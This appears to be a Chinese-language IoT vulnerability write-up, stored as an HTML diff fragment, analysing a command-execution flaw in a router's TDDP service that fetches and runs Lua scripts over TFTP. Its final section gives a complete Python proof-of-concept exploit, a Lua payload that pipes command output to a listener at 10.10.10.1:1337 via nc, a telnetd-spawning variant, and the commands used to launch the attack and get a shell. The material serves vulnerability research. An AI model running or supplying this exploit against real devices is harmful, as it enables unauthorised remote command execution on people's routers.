+<a name="22fvfccac35dmtk9fdclendf50">&nbsp;&nbsp;sub_15e74函数中存在switch-case，疑似用于针对不同服务执行不同处理函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/2b54p3jtgt41n5fbcc2cgt9g76.png"></p>
+<h3 class="topic">
+<a name="3d5rp8mhjl62oc3d1rhtmft6af">&nbsp;&nbsp;&nbsp;漏洞存在于case 0x31对应服务的处理函数sub_A580</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/31129a8s6dbm71esgm7rbgge3g.png"></p>
+<h3 class="topic">
+<a name="0j3akehmb40sp27tn5j5qoulns">&nbsp;&nbsp;&nbsp;&nbsp;函数sub_A580中漏洞点在于sub_91DC，该函数中通过tftp服务下载lua脚本，没有检测脚本内容，并执行脚本&#13;
+，之后的sprintf函数会将s参数表示的文件保存到/tmp/目录下</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/7egnemttid8600s72gj7o3un9g.png"></p>
+<h3 class="topic">
+<a name="39j1nf6hfh2avear762rsbu4km">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行sub_91DC之后会执行lua_call执行lua脚本</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/6qut6d0g8ofk7ot643s27c83si.png"></p>
+<h3 class="topic">
+<a name="58fh0uv95j0d10ug612u990hfd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本机安装atftpd（tftp协议的服务端程序）编辑atftpd配置文件</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1m37o2laq42sl14svgdv83oc1e.png"></p>
+<h3 class="topic">
+<a name="14iqm3o5dh4ebarcq3mfskf46h">&nbsp;&nbsp;配置本地的atftpd选项</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/54cm1o28r7ad17ulptl82bd8j2.png"></p>
+<h3 class="topic">
+<a name="4g0ooie7j0037s4cns8epl87qs">&nbsp;&nbsp;&nbsp;根目录下创建tftpd，该目录下保存payload，该payload会被tddp下载，payload的内容为lua指令</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/5dv3c6gbjtv8loqtf7da6856mq.png"></p>
+<h3 class="topic">
+<a name="68nja2dpf0igtmhnqrtsldf4ue">&nbsp;&nbsp;&nbsp;&nbsp;exp分析</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1qj14dc4vs1b2r524ha3c46jst.png"></p>
+<h3 class="topic">
+<a name="6do5ivneqtls281hl804i16rv6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;监听1337端口</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/58bdqgo7m3cfsnegp1kub2afmu.png"></p>
+<h3 class="topic">
+<a name="2khk6dnrllagevnc6q33f6b5v5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本机上关闭inetutils-inetd.service服务，重新启动atftpd服务，并检查服务启动情况</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/5lo75ng2qja73pcs3a0cbtrc8o.png"></p>
+<h3 class="topic">
+<a name="4i7ec0d7n6qm28n0tq8745tn3a">&nbsp;&nbsp;运行exp，成功获得反弹shell</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/71bgds5f5l3shhltps0v4lqo3m.png"></p>
+<h3 class="topic">
+<a name="00ne4cs21nm4hmlmqfr33m0171">&nbsp;exp &amp;&amp; payload</a>
+</h3>
+<h3 class="topic">
+<a name="49jr25n56dopv9q969ul061sni">&nbsp;&nbsp;#!/usr/bin/python3&#13;
+ &#13;
+# Copyright 2019 Google LLC.&#13;
+# SPDX-License-Identifier: Apache-2.0&#13;
+ &#13;
+# Create a file in your tftp directory with the following contents:&#13;
+#&#13;
+#function config_test(config)&#13;
+#  os.execute("telnetd -l /bin/login.sh")&#13;
+#end&#13;
+#&#13;
+# Execute script as poc.py remoteaddr filename&#13;
+ &#13;
+import sys&#13;
+import binascii&#13;
+import socket&#13;
+ &#13;
+port_send = 1040&#13;
+port_receive = 61000&#13;
+ &#13;
+tddp_ver = "01"&#13;
+tddp_command = "31"&#13;
+tddp_req = "01"&#13;
+tddp_reply = "00"&#13;
+tddp_padding = "%0.16X" % 00&#13;
+ &#13;
+tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])&#13;
+ &#13;
+sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)&#13;
+sock_receive.bind(('', port_receive))&#13;
+ &#13;
+# Send a request&#13;
+sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)&#13;
+packet = binascii.unhexlify(tddp_packet)&#13;
+argument = "%s;arbitrary" % sys.argv[2]&#13;
+packet = packet + argument.encode()&#13;
+sock_send.sendto(packet, (sys.argv[1], port_send))&#13;
+sock_send.close()&#13;
+ &#13;
+response, addr = sock_receive.recvfrom(1024)&#13;
+r = response.encode('hex')&#13;
+print(r)</a>
+</h3>
+<h3 class="topic">
+<a name="7lt6polh63t6pvvbmfs5tm2mes">&nbsp;payload</a>
+</h3>
+<h3 class="topic">
+<a name="569ui8j0rvoaf9a3oncanaeien">&nbsp;&nbsp;function config_test(config)&#13;
+  os.execute("id | nc 10.10.10.1 1337")&#13;
+end</a>
+</h3>
+<h3 class="topic">
+<a name="7jetfgr3ijcpi3sbfvmn99vk95">&nbsp;执行攻击</a>
+</h3>
+<h3 class="topic">
+<a name="5pnckc3kt2d3sca8b0j4niujvs">&nbsp;&nbsp;sudo systemctl start atftpd&#13;
+python exp.py 10.10.10.2 /payload</a>
+</h3>
+<h3 class="topic">
+<a name="63gakpp0p87h5ekrt9eh5q0q06">&nbsp;触发该漏洞时，需要使用wifi直接连接，不能使用互联网连接</a>
+</h3>
+</body>
+</html>
